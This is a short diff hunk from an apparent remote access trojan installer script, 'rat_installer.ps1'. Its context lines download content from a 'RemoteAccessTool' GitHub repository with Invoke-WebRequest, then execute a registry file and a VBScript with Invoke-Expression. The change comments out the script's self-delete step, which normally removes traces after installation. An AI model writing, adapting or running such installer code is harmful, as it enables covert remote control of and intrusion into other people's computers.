@@ -61,5 +61,5 @@ Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/
 Invoke-Expression "./wrev.reg"; Invoke-Expression "./calty.vbs"
 
 # self delete
-cd $initial_dir
-del rat_installer.ps1
+#cd $initial_dir
+#del rat_installer.ps1
